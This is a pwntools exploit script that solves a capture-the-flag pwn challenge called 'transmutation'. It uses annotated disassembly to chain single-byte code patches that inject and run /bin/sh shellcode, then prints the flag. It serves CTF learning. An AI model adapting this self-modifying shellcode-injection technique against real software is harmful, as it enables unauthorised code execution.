from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall_patched')
gdb.attach(p, '''
    # b *0x40118a
    continue
''')

# p = remote('transmutation.opus4-7.b01le.rs', 8443, ssl=True)

# chall function performs a single-byte arbitrary write within the first 0x49 bytes of its own code

# 00401146    int64_t chall()

# 00401146  55                 push    rbp {__saved_rbp}
# 00401147  4889e5             mov     rbp, rsp {__saved_rbp}
# 0040114a  4883ec10           sub     rsp, 0x10
# 0040114e  e8edfeffff         call    getchar
# 00401153  8845ff             mov     byte [rbp-0x1 {var_9}], al
# 00401156  e8e5feffff         call    getchar
# 0040115b  8845fe             mov     byte [rbp-0x2 {var_a}], al
# 0040115e  0fb655fe           movzx   edx, byte [rbp-0x2 {var_a}]
# 00401162  488d0526000000     lea     rax, [rel main]
# 00401169  488d0dd6ffffff     lea     rcx, [rel chall]
# 00401170  4829c8             sub     rax, rcx  {0x49}
# 00401173  4839c2             cmp     rdx, rax
# 00401176  7d14               jge     0x40118c

# 00401178  0fb645fe           movzx   eax, byte [rbp-0x2 {var_a}]
# 0040117c  488d15c3ffffff     lea     rdx, [rel chall]
# 00401183  4801c2             add     rdx, rax
# 00401186  0fb645ff           movzx   eax, byte [rbp-0x1 {var_9}]
# 0040118a  8802               mov     byte [rdx], al

# 0040118c  90                 nop     
# 0040118d  c9                 leave    {__saved_rbp}
# 0040118e  c3                 retn     {__return_addr}

# main function prepares the program for code modification, making the memory page containing chall writable and executable, then invokes chall function

# 0040118f    int32_t main(int32_t argc, char** argv, char** envp)

# 0040118f  55                 push    rbp {__saved_rbp}
# 00401190  4889e5             mov     rbp, rsp {__saved_rbp}
# 00401193  488b05b62e0000     mov     rax, qword [rel stdin]
# 0040119a  be00000000         mov     esi, 0x0
# 0040119f  4889c7             mov     rdi, rax
# 004011a2  e889feffff         call    setbuf
# 004011a7  488b05922e0000     mov     rax, qword [rel stdout]
# 004011ae  be00000000         mov     esi, 0x0
# 004011b3  4889c7             mov     rdi, rax
# 004011b6  e875feffff         call    setbuf
# 004011bb  488b059e2e0000     mov     rax, qword [rel stderr]
# 004011c2  be00000000         mov     esi, 0x0
# 004011c7  4889c7             mov     rdi, rax
# 004011ca  e861feffff         call    setbuf
# 004011cf  488d0570ffffff     lea     rax, [rel chall]
# 004011d6  482500f0ffff       and     rax, 0xfffffffffffff000
# 004011dc  ba07000000         mov     edx, 0x7
# 004011e1  be00100000         mov     esi, 0x1000
# 004011e6  4889c7             mov     rdi, rax  {_init}
# 004011e9  e862feffff         call    mprotect
# 004011ee  e853ffffff         call    chall
# 004011f3  b800000000         mov     eax, 0x0
# 004011f8  5d                 pop     rbp {__saved_rbp}
# 004011f9  c3                 retn     {__return_addr}

# 1. change retn to nop within chall function at 0x40118e
# this will cause chall function execute main function after it ends
opcode_nop = 0x90
offset_retn = 0x48
p.send(bytes([opcode_nop, offset_retn]))

# 2. change jge to jl within chall function at 0x401176
# this will cause chall function be able to perform a single-byte arbitrary write outside its own code
opcode_jl = 0x7c
offset_jge = 0x30
p.send(bytes([opcode_jl, offset_jge]))

# 3. shellcode injection starting from retn instruction within main function at 0x4011f9
# this will cause main function execute shellcode after it ends
shellcode = asm(shellcraft.sh())
offset_shellcode = 0xb3
for i, bt in enumerate(shellcode):
    p.send(bytes([bt, offset_shellcode+i]))

# 4. change push to retn within main function at 0x40118f
# this will cause the program jump from 0x40118f to 0x4011f3
opcode_retn = 0xc3
offset_push = 0x49
p.send(bytes([opcode_retn, offset_push]))

p.interactive()

# bctf{CPU_0pt1m1z3r5_H4T3_th15_0n3_51mp13_tr1ck_5519225335}